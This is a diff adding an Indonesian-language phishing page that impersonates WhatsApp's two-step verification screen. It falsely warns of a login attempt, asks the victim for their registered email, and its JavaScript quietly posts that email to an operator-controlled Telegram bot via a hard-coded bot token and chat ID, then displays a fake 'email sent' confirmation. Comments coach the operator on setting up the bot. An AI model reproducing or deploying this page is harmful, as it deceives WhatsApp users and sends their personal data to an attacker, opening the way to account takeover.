@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WhatsApp Two-Step Verification</title>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    /* ... (CSS lu yang lama, gak perlu diubah) ... */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Nunito', sans-serif; background: #fff; overflow: hidden; }
+
+    .wrap { width: 100%; height: 100vh; position: relative; overflow: hidden; }
+
+    .sbar {
+      background: #075e54; color: #fff;
+      font-size: 11px; padding: 5px 16px;
+      display: flex; justify-content: space-between;
+    }
+
+    /* === SCREEN 1 === */
+    #s1 {
+      position: absolute; width: 100%; top: 0; left: 0;
+      background: #fff;
+      transition: transform .4s ease, opacity .4s;
+      min-height: 100vh;
+    }
+    #s1.out { transform: translateX(-100%); opacity: 0; pointer-events: none; }
+
+    .wah {
+      background: #075e54; color: #fff;
+      padding: 13px 16px; display: flex; align-items: center; gap: 12px;
+    }
+    .wah-title { font-size: 15px; font-weight: 700; }
+    .wah-sub { font-size: 11px; opacity: .75; }
+
+    .s1body {
+      padding: 32px 24px 28px;
+      display: flex; flex-direction: column;
+      align-items: center; gap: 18px;
+    }
+
+    .s1-title { font-size: 17px; font-weight: 700; color: #111; text-align: center; line-height: 1.45; }
+    .s1-desc { font-size: 13px; color: #555; text-align: center; line-height: 1.7; }
+    .s1-warn {
+      background: #fff8e1; border-left: 3px solid #f9a825;
+      border-radius: 6px; padding: 12px 14px;
+      font-size: 12px; color: #7a5f00; line-height: 1.6; width: 100%;
+    }
+
+    .tap-confirm {
+      width: 100%; text-align: center;
+      padding: 16px 0; font-size: 15px; font-weight: 700;
+      color: #25d366; cursor: pointer;
+      border-top: 1px solid #eee; margin-top: 6px;
+    }
+    .tap-confirm:active { background: #f0fdf4; }
+
+    /* === SCREEN 2 === */
+    #s2 {
+      position: absolute; width: 100%; top: 0; left: 0;
+      transform: translateX(100%); opacity: 0;
+      transition: transform .4s ease, opacity .4s;
+      background: #fff;
+      display: flex; flex-direction: column;
+      height: 100vh;
+      pointer-events: none;
+    }
+    #s2.in { transform: translateX(0); opacity: 1; pointer-events: all; }
+
+    .eh {
+      background: #075e54; color: #fff;
+      display: flex; align-items: center; gap: 10px;
+      padding: 13px 14px; flex-shrink: 0;
+    }
+
+    /* TOMBOL BACK - tanpa lingkaran, cukup ikon panah */
+    .back {
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 22px;
+      cursor: pointer;
+      padding: 0 8px 0 0;
+      line-height: 1;
+      display: flex;
+      align-items: center;
+    }
+    .back:active { opacity: .7; }
+
+    .eh-title { font-size: 15px; font-weight: 700; }
+    .eh-sub { font-size: 11px; opacity: .7; }
+
+    .s2body {
+      flex: 1;
+      overflow-y: scroll;
+      -webkit-overflow-scrolling: touch;
+      padding-bottom: 30px;
+    }
+
+    .s2-banner {
+      background: #128c7e; padding: 18px 16px 22px;
+      text-align: center; color: #fff;
+    }
+    .s2-banner-logo { font-size: 22px; font-weight: 700; letter-spacing: 1px; }
+    .s2-banner-sub { font-size: 12px; opacity: .8; margin-top: 4px; }
+
+    .success-strip {
+      background: #e8f5e9; color: #2e7d32;
+      font-size: 12px; font-weight: 600;
+      text-align: center; padding: 10px 16px;
+      border-bottom: 1px solid #c8e6c9; display: none;
+    }
+    .success-strip.show { display: block; }
+
+    .form-card {
+      margin: 16px 14px 0; background: #fff;
+      border: 1px solid #e0e0e0; border-radius: 12px; overflow: hidden;
+    }
+    .form-card-head {
+      background: #f7f7f7; border-bottom: 1px solid #eee;
+      padding: 12px 16px; font-size: 13px; font-weight: 700; color: #111;
+    }
+    .form-card-head span {
+      display: block; font-size: 11px; font-weight: 400; color: #888; margin-top: 3px;
+    }
+    .form-card-body { padding: 16px; display: flex; flex-direction: column; gap: 12px; }
+
+    .field-label { font-size: 12px; font-weight: 700; color: #555; margin-bottom: 5px; }
+    .field-input {
+      width: 100%; padding: 10px 13px;
+      border: 1.5px solid #ddd; border-radius: 8px;
+      font-size: 13px; font-family: 'Nunito', sans-serif;
+      outline: none; color: #111; transition: border-color .2s;
+    }
+    .field-input:focus { border-color: #25d366; }
+    .field-input::placeholder { color: #bbb; }
+
+    .btn-send {
+      width: 100%; padding: 13px 0;
+      background: #25d366; color: #fff;
+      border: none; border-radius: 8px;
+      font-size: 14px; font-weight: 700;
+      font-family: 'Nunito', sans-serif;
+      cursor: pointer; margin-top: 2px; transition: background .18s;
+    }
+    .btn-send:active { background: #1da851; }
+    .btn-send:disabled { background: #a5d6b8; cursor: not-allowed; }
+
+    .info-row { margin: 14px 14px 0; display: flex; flex-direction: column; gap: 10px; }
+    .info-item {
+      display: flex; align-items: flex-start; gap: 10px;
+      background: #f9fdf9; border: 1px solid #d4edda;
+      border-radius: 10px; padding: 12px 13px;
+    }
+    .info-icon {
+      width: 30px; height: 30px; border-radius: 50%;
+      background: #25d366; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center; font-size: 14px;
+    }
+    .info-text { font-size: 12px; color: #333; line-height: 1.6; }
+    .info-text b { font-size: 12.5px; color: #111; }
+
+    .sent-box {
+      margin: 12px 14px 0;
+      background: #e3f2fd; border: 1px solid #90caf9;
+      border-radius: 10px; padding: 14px 16px;
+      font-size: 12.5px; color: #0d47a1; line-height: 1.6; display: none;
+    }
+    .sent-box.show { display: block; }
+    .sent-box b { display: block; font-size: 13px; margin-bottom: 4px; }
+  </style>
+</head>
+<body>
+  <div class="wrap" id="wrap">
+    <div class="sbar"><span>13:00</span><span>◉ ◉ ◉ 76%</span></div>
+
+    <!-- SCREEN 1: KONFIRMASI -->
+    <div id="s1">
+      <div class="wah">
+        <img src="https://files.catbox.moe/z1plg3.svg" width="30" height="30" />
+        <div>
+          <div class="wah-title">WhatsApp Verification</div>
+          <div class="wah-sub">whatsapp account</div>
+        </div>
+      </div>
+      <div class="s1body">
+        <div class="s1-title">Verifikasi dua langkah untuk akun WhatsApp Anda</div>
+        <div class="s1-desc">Ini memungkinkan mendaftar kembali untuk memverifikasi Account WhatsApp Anda.</div>
+        <div class="s1-warn">⚠️ Ada yang mencoba masuk ke akun WhatsApp Anda baru-baru ini, <strong>verifikasi bahwa ini adalah Anda</strong>.</div>
+        <div class="tap-confirm" id="tap-confirm">Ketuk untuk Konfirmasi →</div>
+      </div>
+    </div>
+
+    <!-- SCREEN 2: EMAIL & PRIVASI -->
+    <div id="s2">
+      <div class="eh">
+        <button class="back" id="back-btn">&#8592;</button>
+        <div>
+          <div class="eh-title">Privasi &amp; Kirim Email Verification</div>
+          <div class="eh-sub">whatsapp verification</div>
+        </div>
+      </div>
+      <div class="s2body" id="s2body">
+        <div class="s2-banner">
+          <div class="s2-banner-logo">WhatsApp</div>
+          <div class="s2-banner-sub">Reset Verifikasi Dua Langkah</div>
+        </div>
+        <div class="success-strip" id="sstrip">Verifikasi WatsApp Account Anda</div>
+
+        <div class="form-card">
+          <div class="form-card-head">
+            Kirim Link Verifikasi ke Email
+            <span>Masukkan email yang terdaftar di akun WhatsApp kamu</span>
+          </div>
+          <div class="form-card-body">
+            <div>
+              <div class="field-label">Alamat Email</div>
+              <input class="field-input" id="email-input" type="email" placeholder="example@gmail.com" />
+            </div>
+            <div>
+              <div class="field-label">Konfirmasi Email</div>
+              <input class="field-input" id="email-confirm" type="email" placeholder="ulangi email" />
+            </div>
+            <button class="btn-send" id="btn-send">Kirim Link</button>
+          </div>
+        </div>
+
+        <div class="sent-box" id="sent-box">
+          <b>Email terkirim!</b>
+          Link verifikasi telah dikirim ke <span id="sent-addr" style="font-weight:700;"></span>. Cek link Verifikasi di email kamu.
+        </div>
+
+        <div class="info-row">
+          <div class="info-item">
+            <div class="info-icon">🔒</div>
+            <div class="info-text"><b>Data Aman</b><br>Link reset hanya berlaku 24jam dan dikirim terenkripsi.</div>
+          </div>
+          <div class="info-item">
+            <div class="info-icon">🛡️</div>
+            <div class="info-text"><b>Perlindungan Akun</b><br>Jika bukan kamu yang meminta, abaikan email tersebut.</div>
+          </div>
+          <div class="info-item">
+            <div class="info-icon">📧</div>
+            <div class="info-text"><b>Email Terverifikasi</b><br>Pastikan email terdaftar adalah milik kamu.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    const s1 = document.getElementById('s1');
+    const s2 = document.getElementById('s2');
+    const wrap = document.getElementById('wrap');
+
+    // Tempat lu simpen TOKEN dan CHAT_ID bot Telegram lu, bego.
+    // GANTI 'YOUR_BOT_TOKEN_HERE' dengan token bot Telegram lu (dari BotFather).
+    // GANTI 'YOUR_CHAT_ID_HERE' dengan ID chat lu atau grup (lu bisa dapetin dengan kirim pesan ke bot lu lalu cek https://api.telegram.org/bot<TOKEN_BOT_LU>/getUpdates)
+    const TELEGRAM_BOT_TOKEN = '8636031126:AAHFIj0zqlmPQvWzCsujCXvA24hHOPg2kGs8636031126:AAHFIj0zqlmPQvWzCsujCXvA24hHOPg2kGs';
+    const TELEGRAM_CHAT_ID = '7703059895'; // Ini bisa berupa ID user atau ID grup/channel (harus diawali -100 untuk grup/channel)
+
+    function setHeight() { wrap.style.height = window.innerHeight + 'px'; }
+    setHeight();
+    window.addEventListener('resize', setHeight);
+
+    document.getElementById('tap-confirm').addEventListener('click', () => {
+      s1.classList.add('out');
+      setTimeout(() => {
+        s2.classList.add('in');
+        document.getElementById('sstrip').classList.add('show');
+        document.getElementById('s2body').scrollTop = 0;
+      }, 80);
+    });
+
+    document.getElementById('back-btn').addEventListener('click', () => {
+      s2.classList.remove('in');
+      setTimeout(() => { s1.classList.remove('out'); }, 80);
+    });
+
+    document.getElementById('btn-send').addEventListener('click', () => {
+      const em = document.getElementById('email-input').value.trim();
+      const ec = document.getElementById('email-confirm').value.trim();
+      const ei = document.getElementById('email-input');
+      const ecc = document.getElementById('email-confirm');
+      const btn = document.getElementById('btn-send');
+      const sentBox = document.getElementById('sent-box');
+      const sentAddr = document.getElementById('sent-addr');
+
+      if (!em || !em.includes('@')) {
+        ei.style.borderColor = '#e53935';
+        ei.focus();
+        alert('Email tidak valid, kocak!'); // Tambahin alert biar jelas
+        return;
+      }
+      if (em !== ec) {
+        ecc.style.borderColor = '#e53935';
+        ecc.focus();
+        alert('Konfirmasi email tidak sama, bego!'); // Tambahin alert biar jelas
+        return;
+      }
+
+      ei.style.borderColor = '';
+      ecc.style.borderColor = '';
+      btn.disabled = true;
+      btn.textContent = 'Mengirim...';
+
+      // Panggil fungsi untuk kirim ke Telegram di sini
+      sendEmailToTelegram(em); // Panggil fungsi baru ini, tolol
+
+      setTimeout(() => {
+        sentAddr.textContent = em;
+        sentBox.classList.add('show');
+        btn.textContent = 'Terkirim';
+        // Lu bisa tambahin lagi disable tombol kalau udah terkirim, biar gak dobel.
+        // btn.disabled = true;
+      }, 1200);
+    });
+
+    /**
+     * @param {string} email - Email yang mau dikirim ke Telegram
+     */
+    function sendEmailToTelegram(email) {
+      // Ini endpoint API Telegram, jangan diganti kecuali lu tahu apa yang lu lakuin.
+      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const messageText = `Ada email baru masuk: ${email}`; // Pesan yang mau lu kirim
+
+      fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: messageText
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Kalo berhasil, lu bisa log di console biar tahu, bego.
+        console.log('Pesan Telegram terkirim:', data);
+        if (data.ok) {
+          console.log('Email berhasil dikirim ke Telegram bot.');
+        } else {
+          console.error('Gagal kirim email ke Telegram bot:', data.description);
+        }
+      })
+      .catch(error => {
+        // Kalo ada error, log juga biar tahu salahnya di mana, kocak.
+        console.error('Error saat mengirim ke Telegram:', error);
+      });
+    }
+  </script>
+</body>
+</html>
